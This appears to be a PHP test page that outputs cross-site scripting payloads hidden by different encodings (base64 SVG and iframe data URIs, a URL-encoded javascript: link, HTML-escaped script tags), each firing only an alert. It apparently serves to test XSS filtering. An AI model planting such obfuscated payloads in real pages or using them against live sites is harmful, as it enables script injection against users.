<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS Test Cases</title>
</head>
<body>
    <h1>XSS Test Cases - Encoding ve Obfuscation</h1>

    <!-- Base64 Encoding -->
    <h2>Base64 Encoding</h2>
    <?php
    echo '<img src="data:image/svg+xml;base64,' . base64_encode('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS!\')"></svg>') . '">';
    ?>

    <!-- URL Encoding -->
    <h2>URL Encoding</h2>
    <?php
    echo '<a href="javascript%3Aalert%28%27XSS%20Detected%21%27%29">Tıkla</a>';
    ?>

    <!-- HTML Encoding -->
    <h2>HTML Encoding</h2>
    <?php
    echo '&lt;script&gt;alert(&#39;XSS Detected!&#39;)&lt;/script&gt;';
    ?>

    <!-- Base64 and HTML Encoding -->
    <h2>Base64 and HTML Encoding</h2>
    <?php
    $base64 = base64_encode('<img src="x" onerror="alert(\'XSS!\')">');
    echo htmlspecialchars('<img src="data:image/svg+xml;base64,' . $base64 . '">');
    ?>

    <!-- Base64 and URL Encoding -->
    <h2>Base64 and URL Encoding</h2>
    <?php
    $base64 = base64_encode('<script>alert("XSS!")</script>');
    echo '<iframe src="data:text/html;base64,' . urlencode($base64) . '"></iframe>';
    ?>

    <!-- HTML and URL Encoding -->
    <h2>HTML and URL Encoding</h2>
    <?php
    $script = htmlspecialchars('<script>alert("XSS Detected!")</script>');
    echo '<a href="data:text/html,' . urlencode($script) . '">Tıkla</a>';
    ?>
</body>
</html>
